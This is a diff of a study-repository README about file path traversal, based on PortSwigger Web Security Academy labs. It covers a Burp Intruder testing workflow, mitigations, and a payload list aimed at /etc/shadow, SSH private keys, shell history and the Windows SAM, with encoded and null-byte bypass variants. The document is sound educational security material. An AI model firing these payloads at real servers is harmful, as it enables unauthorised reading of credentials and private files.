@@ -1,122 +1,278 @@
-# Lab 01 – File Path Traversal, Simple Case
+# File Path Traversal
 
-**Difficulty:** Apprentice  
-**Status:** Solved  
-**Platform:** PortSwigger Web Security Academy  
-**Vulnerability:** File Path Traversal (Directory Traversal)
+Welcome to my File Path Traversal learning repository based on the **PortSwigger Web Security Academy**.
 
-## 1. Objective
+This section documents my hands-on practice, including vulnerability analysis, traversal techniques, payloads, testing methods, Burp Suite workflows, and individual lab solutions.
 
-Retrieve the contents of the `/etc/passwd` file by exploiting a File Path Traversal vulnerability in the product image display functionality.
+## 1. What is File Path Traversal?
 
-## 2. Identifying the Vulnerability
+File Path Traversal, also known as Directory Traversal, is a vulnerability that allows an attacker to access files and directories outside the intended directory.
 
-1. Opened the PortSwigger lab and clicked **Access the Lab**.
-2. Opened the lab homepage.
-3. Pressed `Ctrl + U` to inspect the page source.
-4. Searched for `image` to identify image references.
-5. Found the image endpoint:
+It occurs when an application uses user-controlled input to construct file paths without proper validation.
 
-```http
-/image?filename=1.jpg
+An attacker may manipulate file path parameters using directory traversal sequences such as:
+
+```text
+../../../etc/passwd
 ```
 
-The `filename` parameter controls which image file the server retrieves.
+This can potentially allow access to sensitive files on the server.
 
-## 3. Capturing the Request Using Burp Suite
+## 2. How File Path Traversal Works
 
-1. Opened the product image in the browser.
-2. Captured the image request using Burp Suite Proxy.
-3. Identified the request containing the `filename` parameter.
-4. Sent the request to Burp Intruder for testing.
+Applications often use parameters to retrieve files.
 
-**Original request:**
+Example:
 
 ```http
 GET /image?filename=1.jpg HTTP/1.1
 ```
 
-## 4. Configuring Burp Intruder
+The application uses the `filename` parameter to locate the requested image.
 
-1. Selected the **Sniper** attack type.
-2. Set the payload position around the image filename value.
-3. Configured a Simple List payload type.
-4. Added the File Path Traversal payload wordlist.
-5. Started the Intruder attack.
+If the application does not properly validate the supplied filename, an attacker may manipulate the parameter to access files outside the intended directory.
 
-The payload wordlist and common testing methodology are documented in the parent File Path Traversal README.
+Example:
 
-## 5. Analyzing the Attack Results
+```http
+GET /image?filename=../../../../etc/passwd HTTP/1.1
+```
 
-After starting the attack:
+The server may interpret the traversal sequences and access the requested file outside the image directory.
 
-1. Compared the HTTP response status codes.
-2. Examined the response lengths.
-3. Identified the response corresponding to `/etc/passwd`.
-4. Opened the response to verify its contents.
+## 3. Common Testing Methodology
 
-**Successful response characteristics:**
+The following is the common workflow I follow while testing File Path Traversal vulnerabilities in PortSwigger Web Security Academy labs.
 
-- HTTP status: `200 OK`
-- Response content type: `image/jpeg`
-- Response body contained Linux account information.
+### Step 1: Access the Lab
 
-The response included entries such as:
+1. Open the required PortSwigger lab.
+2. Click **Access the Lab**.
+3. Open the lab instance in the browser.
+
+### Step 2: Identify the Image URL
+
+1. Open the lab homepage.
+2. Press `Ctrl + U` to inspect the page source.
+3. Search for `image`.
+4. Identify the image URL and its filename parameter.
+
+Example:
+
+```http
+/image?filename=1.jpg
+```
+
+### Step 3: Capture the Request
+
+1. Open the identified image URL.
+2. Capture the request using Burp Suite Proxy.
+3. Identify the `filename` parameter.
+4. Send the request to Burp Intruder.
+
+### Step 4: Configure Burp Intruder
+
+1. Select the **Sniper** attack type.
+2. Set the payload position around the image filename.
+3. Select **Simple List** as the payload type.
+4. Add the required traversal payloads.
+5. Start the attack.
+
+### Step 5: Analyze Attack Results
+
+After the attack starts:
+
+1. Compare the HTTP status codes.
+2. Compare the response lengths.
+3. Identify unusual response lengths.
+4. Inspect the response body.
+5. Verify whether the requested file contents are returned.
+
+A successful response may contain sensitive file contents instead of the expected image.
+
+**Important:** Response length and status code are indicators, not proof by themselves. Always inspect the response content to confirm the result.
+
+### Step 6: Verify Lab Completion
+
+Check the PortSwigger lab status.
+
+If the lab displays **Solved**, capture the completion evidence.
+
+---
+
+## 4. File Path Traversal Payload Reference
+
+The following payloads are maintained as a common reference for authorized lab testing.
+
+### 4.1 Linux File Traversal Payloads
+
+```text
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../etc/hosts
+../../../../etc/hostname
+../../../../etc/issue
+../../../../proc/self/environ
+../../../../proc/self/cmdline
+../../../../proc/self/cwd/index.php
+../../../../proc/self/fd/0
+../../../../root/.ssh/id_rsa
+../../../../root/.bash_history
+../../../../home/user/.bash_history
+../../../../var/log/apache2/access.log
+../../../../var/log/apache2/error.log
+../../../../var/log/nginx/access.log
+../../../../var/log/auth.log
+../../../../var/log/vsftpd.log
+../../../../var/mail/root
+../../../../var/spool/cron/crontabs/root
+```
+
+### 4.2 Windows File Traversal Payloads
+
+```text
+..\..\..\..\windows\win.ini
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\boot.ini
+..\..\..\..\inetpub\wwwroot\web.config
+..\..\..\..\windows\repair\sam
+..\..\..\..\windows\system32\config\sam
+```
+
+### 4.3 Non-recursive Traversal Bypass
+
+```text
+....//....//....//....//etc/passwd
+```
+
+### 4.4 URL-Encoded Traversal Payloads
+
+```text
+..%2f..%2f..%2f..%2fetc%2fpasswd
+
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+```
+
+### 4.5 Double URL-Encoded Traversal
+
+```text
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
+
+### 4.6 Legacy Encoding Variants
+
+```text
+%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+
+..%c0%af..%c0%af..%c0%afetc/passwd
+```
+
+These are legacy encoding variants. Their behavior depends on the server and decoding implementation.
+
+### 4.7 Null Byte Payloads
+
+```text
+../../../../etc/passwd%00
+
+../../../../etc/passwd%00.jpg
+
+../../../../etc/passwd%00.php
+```
+
+Null byte bypass behavior depends on the application, runtime and file-handling implementation.
+
+---
+
+## 5. Understanding Burp Intruder Results
+
+When testing traversal payloads using Burp Intruder, examine the following:
+
+| Field | Purpose |
+|---|---|
+| Payload | Identifies the tested traversal string |
+| Status Code | Shows the HTTP response status |
+| Response Length | Helps identify unusual responses |
+| Response Body | Confirms whether the requested file was returned |
+
+### Identifying a Successful Response
+
+A successful response may show:
+
+- An unusual response length.
+- HTTP status `200 OK`.
+- File contents instead of the expected image.
+- Recognizable system file entries.
+
+For example, `/etc/passwd` may contain:
 
 ```text
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ```
 
-This confirmed that the application returned the contents of `/etc/passwd` instead of the requested product image.
+Always verify the response body rather than relying only on response length.
 
-## 6. Result
+---
 
-The application allowed directory traversal through the `filename` parameter.
+## 6. Individual Lab Documentation
 
-By using directory traversal sequences, it was possible to access a file outside the intended image directory.
+| Lab | Topic | Status |
+|---|---|---|
+| Lab-01 | File Path Traversal – Simple Case | Completed |
+| Lab-02 | Traversal Sequences Blocked with Absolute Path Bypass | Completed |
+| Lab-03 | Traversal Sequences Stripped Non-recursively | Completed |
+| Lab-04 | Traversal Sequences Stripped with Superfluous URL Decode | Completed |
+| Lab-05 | Validation of Start of Path | Completed |
+| Lab-06 | Validation of File Extension with Null Byte Bypass | Completed |
 
-**Result:** Successfully retrieved `/etc/passwd` and solved the PortSwigger lab.
+Individual lab folders contain the specific testing methodology, payloads, observations, evidence and results.
+
+**Note:** Lab completion and repository documentation completion are tracked separately.
+
+---
 
 ## 7. Security Impact
 
-An attacker could potentially:
+File Path Traversal vulnerabilities may allow attackers to:
 
-- Read sensitive files from the server filesystem.
-- Access configuration files.
-- Discover system information.
-- Expose sensitive application or user data.
+- Read sensitive system files.
+- Access application configuration files.
+- Retrieve credentials stored in accessible files.
+- Expose internal application information.
+- Access files outside the intended directory.
 
-The actual impact depends on the files accessible to the application process.
+The impact depends on application permissions and server configuration.
 
-## 8. Evidence
+## 8. Prevention and Mitigation
 
-| Evidence | Description |
-|---|---|
-| 01 | PortSwigger lab overview |
-| 02 | Accessing the lab homepage |
-| 03 | Inspecting page source using Ctrl + U |
-| 04 | Identifying the image URL and filename parameter |
-| 05 | Capturing the image request in Burp Suite Proxy |
-| 06 | Configuring Burp Intruder and traversal payloads |
-| 07 | Analyzing Intruder attack results |
-| 08 | Verifying the `/etc/passwd` response |
-| 09 | PortSwigger lab solved confirmation |
+Developers should:
 
-## 9. Key Learning
+1. Avoid using raw user input to construct file paths.
+2. Use allowlists for permitted filenames.
+3. Canonicalize and validate file paths.
+4. Restrict file access to an intended directory.
+5. Use secure file-handling APIs.
+6. Apply least-privilege filesystem permissions.
+7. Reject unexpected path separators and traversal sequences.
+8. Avoid relying only on string filtering or blacklists.
 
-- Learned how to identify file-handling parameters from page source.
-- Practiced intercepting HTTP requests using Burp Suite.
-- Learned how to configure Burp Intruder with the Sniper attack type.
-- Practiced testing directory traversal payloads.
-- Learned to compare response status codes and lengths.
-- Verified successful file retrieval through response content.
+## 9. Tools Used
 
-## 10. Conclusion
+- Burp Suite Professional
+- Browser Developer Tools
+- PortSwigger Web Security Academy
 
-This lab demonstrated how improper validation of file paths can lead to File Path Traversal vulnerabilities.
+## 10. Learning Objectives
 
-By manipulating the `filename` parameter, it was possible to retrieve `/etc/passwd` from the server filesystem.
+- Understand File Path Traversal vulnerabilities.
+- Identify vulnerable file-handling parameters.
+- Learn directory traversal techniques.
+- Practice bypassing common path validation mechanisms.
+- Use Burp Suite Proxy and Intruder for manual testing.
+- Analyze HTTP responses to verify vulnerabilities.
+- Understand security impact and mitigation techniques.
 
-**Lab Status: Successfully Solved.**
+## 11. Disclaimer
+
+All testing documented in this repository is performed in authorized PortSwigger Web Security Academy labs for educational purposes.
+
+**Learning Platform:** https://portswigger.net/web-security/file-path-traversal
